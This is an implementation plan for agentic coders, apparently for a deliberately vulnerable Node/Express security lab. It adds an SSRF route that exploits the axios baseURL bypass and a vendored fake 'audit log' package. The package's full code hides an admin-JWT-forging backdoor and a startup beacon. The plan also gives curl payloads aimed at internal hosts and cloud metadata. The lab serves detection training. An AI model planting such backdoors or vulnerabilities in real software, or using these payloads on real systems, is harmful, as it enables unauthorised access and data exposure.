# SSRF realista + supply chain (slopsquatting) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Substituir o SSRF genérico do "verificar ambiente" por um cenário realista onde o CVE-2024-39338 do axios é o mecanismo de exploração de fato, e introduzir uma dependência maliciosa vendorizada (slopsquatting) que demonstra supply chain de ponta a ponta, incluindo um serviço interno (`kb-interna`) e um nginx como ingresso único.

**Architecture:** Backend Express ganha uma rota `GET /api/admin/kb?ref=` que usa `axios.create({ baseURL })` contra um novo serviço `kb-interna` (nginx estático, sem porta publicada) — o bypass do `baseURL` via `ref` protocol-relative é o CVE-2024-39338 em ação. Em paralelo, um pacote local `express-audit-log` (vendorizado em `backend/vendor/`) é montado como middleware global e contém um backdoor de bypass de autenticação + beacon C2, não coberto por SCA (sem CVE público). Um novo serviço `nginx` no compose vira o ingresso único (porta 80), roteando `/api/*` pro backend e `/*` pro frontend.

**Tech Stack:** Node.js/Express (backend), React/Vite (frontend), nginx:alpine (kb-interna + proxy reverso), Docker Compose, axios 1.7.3 (fixado), jsonwebtoken 8.5.1 (fixado).

## Global Constraints

- Não atualizar as dependências fixadas com CVE conhecido: `jsonwebtoken` ≤8.5.1, `express` <4.19.2, `axios` 1.3.2–1.7.3, `multer` 1.4.4-lts.1–2.0.1 (ver CLAUDE.md).
- Não adicionar rate-limit, hashing forte, `algorithms` em `jwt.verify()`, sanitização, ou checagem de dono/admin em rotas marcadas como vulneráveis — a ausência é o vetor planejado.
- Implementar exatamente a versão vulnerável descrita nas tasks abaixo, sem mitigar nada "de graça".
- Nomes de tabelas/colunas e comentários de código em português, consistente com o restante do repo.
- O projeto **não usa framework de testes automatizados** — verificação é manual via `curl` / `docker compose`, seguindo o padrão já usado no resto do repo. Não introduzir Jest/Mocha/etc.
- O pacote malicioso da Unidade 2 deve ser **vendorizado localmente** (`file:./vendor/...` no `package.json`), nunca baixado de um registry real.
- Na rota SSRF (Unidade 1), o `ref` do usuário deve ser passado **diretamente** para `kb.get(ref)` — sem prefixo fixo antes dele. Um prefixo fixo (ex.: sempre `'/artigos/' + ref`) neutraliza o `//host` protocol-relative e mata o CVE-2024-39338. Não "simplificar" isso.
- Convenção do frontend: token JWT em `localStorage`, papel lido do token no cliente — não mudar isso.
- Mensagens de commit em português, terminando com `Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>`.

---

## Task 1: Vendorizar o pacote malicioso `express-audit-log`

**Files:**
- Create: `backend/vendor/express-audit-log/package.json`
- Create: `backend/vendor/express-audit-log/index.js`

**Interfaces:**
- Consumes: `jsonwebtoken` (resolvido via a árvore `node_modules` do `backend`, já que o pacote vive dentro de `backend/vendor/`), `process.env.JWT_SECRET` (mesmo fallback `'aurora'` de `backend/src/auth.js`), `process.env.AUDIT_DEBUG_KEY` (fallback `'trace-9f2c'`), `process.env.AUDIT_LOG_ENDPOINT` (fallback `'http://192.0.2.10/collect'`).
- Produces: `module.exports = function auditLog()` — uma factory que retorna um middleware Express `(req, res, next) => void`. Consumido pela Task 2 via `require('express-audit-log')()`.

Este pacote simula uma dependência de "slopsquatting": um nome plausível de
helper de auditoria, com uma fachada benigna (loga requisições) e um backdoor
escondido. Ele é **vendorizado localmente** — nunca publicado ou baixado de
um registry real.

- [ ] **Step 1: Criar o `package.json` do pacote vendorizado**

```json
{
  "name": "express-audit-log",
  "version": "1.0.0",
  "description": "Middleware de log de auditoria para requisições Express.",
  "main": "index.js",
  "dependencies": {
    "jsonwebtoken": "8.5.1"
  }
}
```

- [ ] **Step 2: Criar o middleware com o backdoor e o beacon**

```js
// backend/vendor/express-audit-log/index.js
//
// Pacote vendorizado de propósito (laboratório) para simular uma dependência
// "slopsquattada": nome plausível de helper de auditoria, com um backdoor
// escondido atrás de uma fachada benigna de logging.
const http = require('http');
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET || 'aurora';
const DEBUG_KEY = process.env.AUDIT_DEBUG_KEY || 'trace-9f2c';
const BEACON_URL = process.env.AUDIT_LOG_ENDPOINT || 'http://192.0.2.10/collect';

// Beacon "telemetria de instalação" — dispara uma vez, no carregamento do
// módulo (startup do processo). 192.0.2.0/24 é TEST-NET-1 (RFC 5737), não
// roteável na internet real — fora do laboratório essa chamada só expira em
// silêncio; dentro do laboratório, BEACON_URL pode apontar pro coletor/Kali.
function beacon() {
  try {
    const req = http.get(BEACON_URL, { timeout: 2000 }, (res) => res.resume());
    req.on('timeout', () => req.destroy());
    req.on('error', () => {});
  } catch (_) {
    // silencioso — não pode derrubar o processo hospedeiro
  }
}
beacon();

function auditLog() {
  return function (req, res, next) {
    console.log(`[audit] ${req.method} ${req.path}`);

    // Backdoor: header mágico forja um JWT admin e sobrescreve o
    // Authorization ANTES do authMiddleware da aplicação rodar, então o
    // token forjado passa pela verificação normal como se fosse legítimo.
    if (req.headers['x-debug'] === DEBUG_KEY) {
      const token = jwt.sign(
        { id: 0, email: 'backdoor@aurora.local', papel: 'admin' },
        JWT_SECRET,
        { expiresIn: '1h' }
      );
      req.headers.authorization = `Bearer ${token}`;
    }

    next();
  };
}

module.exports = auditLog;
```

- [ ] **Step 3: Escrever um script de verificação manual (fora do repo)**

Crie um arquivo temporário `/tmp/verify-audit-log.js` (não faz parte do
repositório — é só para validar o middleware isoladamente antes de
conectá-lo à aplicação real):

```js
process.env.JWT_SECRET = 'test-secret';
process.env.AUDIT_DEBUG_KEY = 'trace-9f2c';

const express = require('express');
const assert = require('assert');
const jwt = require('jsonwebtoken');
const auditLog = require('/home/mateus/projects/vulnerable-app-node/backend/vendor/express-audit-log');

const app = express();
app.use(auditLog());
app.get('/protegido', (req, res) => {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  const payload = jwt.verify(token, 'test-secret');
  res.json(payload);
});

const server = app.listen(4999, () => {
  const http = require('http');
  http.get(
    { host: 'localhost', port: 4999, path: '/protegido', headers: { 'X-Debug': 'trace-9f2c' } },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        const payload = JSON.parse(body);
        assert.strictEqual(payload.papel, 'admin');
        console.log('OK: backdoor concedeu papel admin =>', payload);
        server.close();
      });
    }
  );
});
```

- [ ] **Step 4: Rodar o script e conferir a saída**

Run: `node /tmp/verify-audit-log.js`
Expected: linha `OK: backdoor concedeu papel admin => { id: 0, email: 'backdoor@aurora.local', papel: 'admin', iat: ..., exp: ... }` — sem erro de `assert`.

> Nota: como `express-audit-log/index.js` fica fisicamente dentro de
> `backend/vendor/`, o `require('jsonwebtoken')` dentro dele resolve pela
> árvore `backend/node_modules` (já instalada), independente de onde o
> script de verificação estiver rodando.

- [ ] **Step 5: Apagar o script temporário**

Run: `rm /tmp/verify-audit-log.js`

- [ ] **Step 6: Commit**

```bash
git add backend/vendor/express-audit-log
git commit -m "$(cat <<'EOF'
Vendoriza pacote malicioso express-audit-log (slopsquatting)

Middleware de auditoria com fachada benigna que esconde um backdoor de
bypass de autenticação (header X-Debug forja JWT admin) e um beacon de
saída no startup — ainda não conectado à aplicação.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Conectar o pacote malicioso ao backend

**Files:**
- Modify: `backend/package.json`
- Modify: `backend/src/index.js`
- Modify: `.env.example`
- Modify: `.env` (não versionado — ajustar localmente, não faz parte do commit)
- Modify: `docker-compose.yml`

**Interfaces:**
- Consumes: `require('express-audit-log')()` da Task 1 (mesma assinatura: factory sem argumentos, retorna middleware `(req,res,next)`).
- Produces: qualquer requisição HTTP ao backend agora passa pelo middleware de auditoria antes de qualquer `authMiddleware` de rota — comportamento consumido implicitamente por todas as rotas existentes (nenhuma rota precisa saber disso).

- [ ] **Step 1: Adicionar a dependência local ao `backend/package.json`**

Em `backend/package.json`, dentro de `"dependencies"`, adicionar:

```json
    "express-audit-log": "file:./vendor/express-audit-log",
```

(mantendo as demais dependências existentes inalteradas, incluindo as 4 pinadas com CVE).

- [ ] **Step 2: Instalar**

Run: `cd backend && npm install`
Expected: conclui sem erro; `backend/node_modules/express-audit-log` aparece como link para `../vendor/express-audit-log`; `backend/package-lock.json` é atualizado.

- [ ] **Step 3: Montar o middleware global em `backend/src/index.js`**

Adicionar o `require` perto dos outros requires de rotas, e o `app.use` logo após `app.use(express.json())`:

```js
const adminRoutes = require('./routes/admin');
const auditLog = require('express-audit-log');
```

```js
app.use(cors());
app.use(express.json());
app.use(auditLog());
```

- [ ] **Step 4: Adicionar as variáveis de ambiente do backdoor ao `.env.example`**

Ao final de `.env.example`, adicionar:

```
# Vetores de laboratório (slopsquatting) — não usar em produção.
AUDIT_DEBUG_KEY=trace-9f2c
AUDIT_LOG_ENDPOINT=http://192.0.2.10/collect
```

- [ ] **Step 5: Adicionar as mesmas variáveis ao `.env` local**

`.env` não é versionado (está no `.gitignore`) — edite o arquivo local adicionando as mesmas duas linhas do Step 4, com os mesmos valores.

- [ ] **Step 6: Repassar as variáveis no `docker-compose.yml`**

No serviço `backend`, dentro de `environment:`, adicionar (mantendo as chaves existentes):

```yaml
      AUDIT_DEBUG_KEY: ${AUDIT_DEBUG_KEY}
      AUDIT_LOG_ENDPOINT: ${AUDIT_LOG_ENDPOINT}
```

- [ ] **Step 7: Verificar o bypass manualmente**

Run: `cd backend && npm run dev` (ou `docker compose up backend db`)

Sem nenhum token, a rota nega:
Run: `curl -i http://localhost:3001/api/usuarios`
Expected: `HTTP/1.1 401` e corpo `{"error":"token ausente"}`.

Só com o header mágico do backdoor (sem token nenhum), a rota concede acesso:
Run: `curl -i http://localhost:3001/api/usuarios -H "X-Debug: trace-9f2c"`
Expected: `HTTP/1.1 200` e um array JSON de usuários.

No console do backend, confirme a linha `[audit] GET /api/usuarios` — prova que o middleware rodou.

- [ ] **Step 8: Verificar o beacon de saída no startup**

Suba um listener local e aponte o beacon pra ele antes de iniciar o backend:

```bash
nc -l 9000 &
AUDIT_LOG_ENDPOINT=http://localhost:9000/collect JWT_SECRET=aurora PGHOST=... npm run dev
# (ou, via docker compose: ajuste AUDIT_LOG_ENDPOINT=http://host.docker.internal:9000/collect no .env antes de subir)
```

Expected: o `nc` recebe uma conexão (linha de requisição HTTP `GET /collect ...`) assim que o processo do backend sobe, antes de qualquer requisição de usuário — confirma o beacon disparando no `require()` do módulo. Depois, restaure `AUDIT_LOG_ENDPOINT` para o valor padrão do `.env`.

- [ ] **Step 9: Commit**

```bash
git add backend/package.json backend/package-lock.json backend/src/index.js .env.example
git commit -m "$(cat <<'EOF'
Conecta o backdoor express-audit-log ao backend

Monta o middleware globalmente antes de qualquer rota — header X-Debug
forja um JWT admin e concede acesso sem credenciais reais. Sem CVE
público: não detectável por SCA, só em runtime.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Serviço `kb-interna` + rota SSRF `GET /api/admin/kb`

**Files:**
- Create: `kb-interna/artigos/1.json`
- Create: `kb-interna/artigos/2.json`
- Modify: `backend/src/routes/admin.js`
- Modify: `docker-compose.yml`
- Modify: `.env.example`
- Modify: `.env` (não versionado)

**Interfaces:**
- Consumes: `axios` (já uma dependência fixada do backend), `authMiddleware` de `backend/src/auth.js` (mesma assinatura já usada nas outras rotas de `admin.js`).
- Produces: rota `GET /api/admin/kb?ref=<path>` → `{ status: number, corpo: any }` em caso de sucesso, ou `{ erro: string }` com HTTP 502 em caso de falha. Consumida pela Task 4 (frontend).

- [ ] **Step 1: Criar os artigos fake da KB interna**

```json
// kb-interna/artigos/1.json
{
  "titulo": "Como emitir nota fiscal eletrônica (NF-e)",
  "corpo": "Acesse o menu Fiscal > Emitir NF-e, selecione o certificado digital A1 vigente e confirme os dados do cliente antes de emitir."
}
```

```json
// kb-interna/artigos/2.json
{
  "titulo": "Reiniciar o TEF após falha na maquininha",
  "corpo": "Desligue a maquininha, aguarde 10 segundos, religue e aguarde o pareamento com o PDV antes de tentar uma nova transação."
}
```

- [ ] **Step 2: Adicionar o serviço `kb-interna` ao `docker-compose.yml`**

Adicionar como um novo serviço (sem `ports:` — só alcançável de dentro da rede do compose):

```yaml
  kb-interna:
    image: nginx:alpine
    volumes:
      - ./kb-interna/artigos:/usr/share/nginx/html/artigos:ro
```

- [ ] **Step 3: Substituir a rota `POST /health-check` por `GET /kb` em `backend/src/routes/admin.js`**

Remover o import agora não utilizado e o handler antigo:

```js
// remover esta linha:
const { exec } = require('child_process');
```

```js
// remover este bloco inteiro (rota POST /health-check, linhas 9-36 do arquivo original):
// POST /api/admin/health-check — ⚠️ command injection + SSRF. [...]
router.post('/health-check', authMiddleware, async (req, res) => {
  /* ... */
});
```

Adicionar no lugar:

```js
const kb = axios.create({
  baseURL: process.env.KB_INTERNA_URL || 'http://kb-interna',
  timeout: 5000,
});

// GET /api/admin/kb?ref= — ⚠️ SSRF: bypass de baseURL via CVE-2024-39338 do
// axios. `ref` é repassado direto ao axios.get(); um valor protocol-relative
// (ex.: //host) é resolvido pelo axios ≤1.7.3 como URL absoluta, escapando
// do baseURL fixado acima e alcançando o host informado pelo atacante.
router.get('/kb', authMiddleware, async (req, res) => {
  const ref = req.query.ref || '/artigos/1.json';
  try {
    const r = await kb.get(ref);
    res.json({ status: r.status, corpo: r.data });
  } catch (err) {
    res.status(502).json({ erro: err.message });
  }
});
```

O arquivo final deve manter a rota `GET /relatorio` inalterada logo abaixo.

- [ ] **Step 4: Adicionar `KB_INTERNA_URL` ao `.env.example` e ao `.env` local**

Em `.env.example`, adicionar:

```
KB_INTERNA_URL=http://kb-interna
```

Adicionar a mesma linha em `.env` (não versionado).

- [ ] **Step 5: Repassar `KB_INTERNA_URL` no `docker-compose.yml`**

No serviço `backend`, dentro de `environment:`, adicionar:

```yaml
      KB_INTERNA_URL: ${KB_INTERNA_URL}
```

E em `depends_on:` do serviço `backend`, adicionar `kb-interna` como dependência simples (sem `condition`, já que o `kb-interna` não expõe healthcheck):

```yaml
    depends_on:
      db:
        condition: service_healthy
      kb-interna:
        condition: service_started
```

- [ ] **Step 6: Subir os serviços e obter um token**

Run: `docker compose up -d db backend kb-interna`

Run:
```bash
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"cliente1@exemplo.com","senha":"cliente123"}'
```
Expected: JSON com um campo `token`. Copie o valor para usar nos próximos comandos como `$TOKEN`.

- [ ] **Step 7: Verificar o uso normal (sem exploração)**

Run:
```bash
export TOKEN="<token copiado no Step 6>"
curl --get "http://localhost:3001/api/admin/kb" \
  --data-urlencode "ref=/artigos/1.json" \
  -H "Authorization: Bearer $TOKEN"
```
Expected: `{"status":200,"corpo":{"titulo":"Como emitir nota fiscal eletrônica (NF-e)", ...}}`.

- [ ] **Step 8: Verificar o bypass do `baseURL` (CVE-2024-39338)**

Usamos o serviço `db` (Postgres, já obrigatório para o backend subir) como
"host de terceiro" alcançável só via bypass. Postgres não fala HTTP, então
uma resposta bem-sucedida da KB (`status`/`corpo` JSON) versus um erro de
parsing/conexão prova de forma determinística que o destino mudou:

Run:
```bash
curl --get "http://localhost:3001/api/admin/kb" \
  --data-urlencode "ref=//db:5432/" \
  -H "Authorization: Bearer $TOKEN"
```
Expected: `HTTP 502` com `{"erro": "..."}` (erro de parsing HTTP ou conexão recusada/resetada pelo Postgres) — **não** o JSON de artigo da KB. Isso prova que a requisição foi para `db:5432` em vez de `kb-interna`, ou seja, o `baseURL` foi escapado pelo `ref` protocol-relative.

- [ ] **Step 9: Commit**

```bash
git add kb-interna backend/src/routes/admin.js docker-compose.yml .env.example
git commit -m "$(cat <<'EOF'
Substitui health-check genérico por SSRF real via bypass de baseURL

GET /api/admin/kb consulta uma KB interna via axios com baseURL fixo;
um ref protocol-relative escapa do baseURL (CVE-2024-39338 do axios
1.7.3 fixado no projeto), alcançando qualquer host da rede interna.
Remove o command injection redundante (já coberto por /pdf).

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Frontend — trocar "Verificar ambiente" por "Consultar base de conhecimento"

**Files:**
- Modify: `frontend/src/pages/Admin.jsx`
- Modify: `frontend/src/pages/Admin.module.css`

**Interfaces:**
- Consumes: `GET /api/admin/kb?ref=` da Task 3, via `apiGet` de `frontend/src/lib/api.js` (assinatura existente: `apiGet(path) => Promise<any>`).
- Produces: nada consumido por outras tasks — é a ponta da cadeia.

- [ ] **Step 1: Atualizar os imports de ícones**

Em `frontend/src/pages/Admin.jsx`, trocar:

```jsx
import { UserPlus, Trash2, Activity, Terminal, Globe, Radio } from "lucide-react";
```

por:

```jsx
import { UserPlus, Trash2, Terminal, Globe } from "lucide-react";
```

- [ ] **Step 2: Atualizar o subtítulo do painel e trocar o componente montado**

Trocar:

```jsx
        subtitle="Gestão de usuários e verificação do ambiente."
```

por:

```jsx
        subtitle="Gestão de usuários e consulta à base de conhecimento."
```

Trocar:

```jsx
      <HealthCheck />
```

por:

```jsx
      <ConsultaKb />
```

- [ ] **Step 3: Substituir o componente `HealthCheck` inteiro por `ConsultaKb`**

Remover a função `HealthCheck` completa (de `function HealthCheck() {` até o `}` que a fecha, logo antes de `function NovoUsuario`) e colocar no lugar:

```jsx
function ConsultaKb() {
  const [ref, setRef] = useState("/artigos/1.json");
  const [saida, setSaida] = useState(null);
  const [rodando, setRodando] = useState(false);

  // ⚠️ SSRF: `ref` é repassado ao axios com baseURL fixo no backend; um
  // valor protocol-relative (ex.: //169.254.169.254/...) bypassa o baseURL
  // (CVE-2024-39338 do axios 1.7.3 fixado no projeto).
  async function consultar(e) {
    e.preventDefault();
    setRodando(true);
    try {
      const r = await apiGet(`/admin/kb?ref=${encodeURIComponent(ref)}`);
      setSaida(
        `status ${r.status}\n\n` +
          (typeof r.corpo === "string" ? r.corpo : JSON.stringify(r.corpo, null, 2))
      );
    } catch (err) {
      setSaida(err.message);
    } finally {
      setRodando(false);
    }
  }

  return (
    <Card className={styles.health}>
      <h2 className={styles.blocoTitulo}>
        <Globe size={18} /> Consultar base de conhecimento
      </h2>
      <p className={styles.healthSub}>
        Busca artigos da base de conhecimento interna a partir do servidor da aplicação.
      </p>

      <form className={styles.healthCol} onSubmit={consultar}>
        <label className={styles.healthLabel}><Globe size={14} /> Referência do artigo</label>
        <div className={styles.healthRow}>
          <Input placeholder="/artigos/1.json" value={ref} onChange={(e) => setRef(e.target.value)} className="mono" />
          <Button type="submit" variant="secondary" loading={rodando}>Consultar</Button>
        </div>
        {saida !== null && (
          <pre className={styles.terminal}>
            <span className={styles.terminalHead}><Terminal size={12} /> resposta</span>
            {saida}
          </pre>
        )}
      </form>
    </Card>
  );
}
```

- [ ] **Step 4: Remover o CSS agora órfão de `frontend/src/pages/Admin.module.css`**

O layout de duas colunas (`healthGrid`) não existe mais — a nova seção tem só
uma coluna (`healthCol` sozinho). Remover o bloco:

```css
.healthGrid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
}
```

E remover a entrada correspondente no media query ao final do arquivo:

```css
@media (max-width: 760px) {
  .healthGrid {
    grid-template-columns: 1fr;
  }
  .novoGrid {
    grid-template-columns: 1fr;
  }
}
```
vira:
```css
@media (max-width: 760px) {
  .novoGrid {
    grid-template-columns: 1fr;
  }
}
```

- [ ] **Step 5: Rodar o frontend e verificar visualmente**

Run: `docker compose up -d db backend kb-interna frontend` (ou `cd frontend && npm run dev` com o backend já rodando)

Abrir `http://localhost:5173/admin` (logado como admin), confirmar:
- O card agora se chama "Consultar base de conhecimento" (não mais "Verificar ambiente").
- Preencher `/artigos/2.json` e clicar "Consultar" retorna o artigo sobre TEF no painel de resposta.
- Sem erros no console do navegador.

- [ ] **Step 6: Commit**

```bash
git add frontend/src/pages/Admin.jsx frontend/src/pages/Admin.module.css
git commit -m "$(cat <<'EOF'
Troca "Verificar ambiente" por "Consultar base de conhecimento" no admin

Componente ConsultaKb substitui o antigo HealthCheck (ping + SSRF
genérico), agora consumindo GET /api/admin/kb — o SSRF via bypass de
baseURL do axios.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

## Task 5: nginx como proxy reverso (ingresso único)

**Files:**
- Create: `nginx/nginx.conf`
- Modify: `docker-compose.yml`

**Interfaces:**
- Consumes: serviços `backend` (porta 3001) e `frontend` (porta 5173) já existentes no compose.
- Produces: porta 80 do host roteando para ambos — não consumido por nenhuma outra task deste plano.

- [ ] **Step 1: Criar a configuração do nginx**

```nginx
# nginx/nginx.conf
server {
    listen 80;

    location /api/ {
        proxy_pass http://backend:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location / {
        proxy_pass http://frontend:5173;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

- [ ] **Step 2: Adicionar o serviço `nginx` ao `docker-compose.yml`**

```yaml
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on:
      - backend
      - frontend
```

- [ ] **Step 3: Subir a stack completa e verificar o roteamento**

Run: `docker compose up -d`

Run: `curl -s http://localhost/api/health`
Expected: `{"status":"ok","db":"connected"}` (roteado para o backend).

Run: `curl -sI http://localhost/ | head -1`
Expected: `HTTP/1.1 200 OK` (roteado para o frontend/Vite).

- [ ] **Step 4: Commit**

```bash
git add nginx docker-compose.yml
git commit -m "$(cat <<'EOF'
Adiciona nginx como proxy reverso / ingresso único (porta 80)

Roteia /api/* para o backend e /* para o frontend, aproximando a
topologia local de uma DMZ real. Portas 3001/5173 seguem publicadas
para uso standalone em desenvolvimento.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

## Task 6: Atualizar o README

**Files:**
- Modify: `README.md`

**Interfaces:**
- Consumes: comportamento real das Tasks 1-3 (rota `/api/admin/kb`, backdoor `X-Debug`).
- Produces: nada — documentação final.

- [ ] **Step 1: Reescrever o item 6 do catálogo**

Trocar o bloco atual (título `### 6. Command Injection + SSRF...` até o fim
do bloco de código `curl` que o segue) por:

```markdown
### 6. SSRF via bypass de `baseURL` — `GET /api/admin/kb?ref=`

A "consulta à base de conhecimento interna" usa
`axios.create({ baseURL: 'http://kb-interna' })` e repassa o parâmetro `ref`
direto pro `axios.get(ref)`. Em uso normal, `ref` é um path relativo
(`/artigos/1.json`) e retorna um artigo da KB interna (container
`kb-interna`, sem porta publicada — só alcançável a partir do backend). Um
`ref` **protocol-relative** explora o CVE-2024-39338 do axios 1.7.3 fixado no
projeto: versões ≤1.7.3 resolvem `//host` como URL absoluta, ignorando o
`baseURL` e escapando para o host informado pelo atacante.

```bash
# Uso normal: artigo da KB interna
curl --get "http://localhost:3001/api/admin/kb" \
  --data-urlencode "ref=/artigos/1.json" \
  -H "Authorization: Bearer $TOKEN"

# SSRF: bypass do baseURL — sonda rede interna que não deveria ser alcançável
curl --get "http://localhost:3001/api/admin/kb" \
  --data-urlencode "ref=//192.168.1.1:22" \
  -H "Authorization: Bearer $TOKEN"

# SSRF contra metadata endpoint (se rodando em nuvem)
curl --get "http://localhost:3001/api/admin/kb" \
  --data-urlencode "ref=//169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer $TOKEN"
```
```

- [ ] **Step 2: Adicionar a seção 9 (dependência maliciosa) após o item 8**

Após o bloco atual do item `### 8. Autenticação fraca` (antes do heading
`## Dependências vulneráveis conhecidas`), adicionar:

```markdown
### 9. Dependência maliciosa (slopsquatting) — backdoor de autenticação

O backend usa um pacote local `express-audit-log` (vendorizado em
`backend/vendor/express-audit-log/`, nome plausível de um "pacote de
auditoria" que uma IA sugeriria sem revisão) que, além de logar requisições,
contém um backdoor: ao ver o header `X-Debug` com o valor esperado, ele forja
um JWT `papel: admin` usando o mesmo segredo fraco do projeto e sobrescreve o
`Authorization` da requisição **antes** do middleware de autenticação normal
rodar — qualquer requisição vira admin, mesmo sem token nenhum. O pacote
também dispara uma tentativa de conexão de saída (beacon) no startup do
processo.

```bash
# Sem token nenhum, a rota normalmente nega:
curl -i "http://localhost:3001/api/usuarios"

# O header mágico do backdoor concede acesso sem nenhuma credencial real:
curl -i "http://localhost:3001/api/usuarios" -H "X-Debug: trace-9f2c"
```

Diferente das 4 dependências da tabela abaixo, este pacote **não tem CVE
público** — o Trivy/SCA não tem base pra correlacionar e não o detecta. Só é
interceptado em runtime: Wazuh (processo com conexão de saída anômala no
startup, FIM sobre `node_modules`/`vendor`) e Suricata (tráfego C2 de saída).
```

- [ ] **Step 3: Anotar o limite da SCA logo após a tabela de dependências**

Após a tabela em `## Dependências vulneráveis conhecidas (detectáveis via Trivy/SCA)`, adicionar:

```markdown
> O pacote `express-audit-log` (item 9 acima) não aparece nesta tabela de
> propósito: é uma dependência maliciosa sem CVE público, usada para
> demonstrar o limite da SCA — o Trivy detecta CVE conhecido, não um
> backdoor novo sem advisory público.
```

- [ ] **Step 4: Conferir que não sobrou referência ao endpoint antigo**

Run: `grep -n "health-check" README.md`
Expected: nenhuma ocorrência.

Run: `grep -n "api/admin/kb" README.md`
Expected: ocorrências no item 6 reescrito.

- [ ] **Step 5: Commit**

```bash
git add README.md
git commit -m "$(cat <<'EOF'
Atualiza README: SSRF real via baseURL + dependência maliciosa

Reescreve o item 6 (health-check → consulta à KB interna) e documenta
o novo vetor de supply chain (express-audit-log), incluindo a nota
sobre o limite da SCA.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```
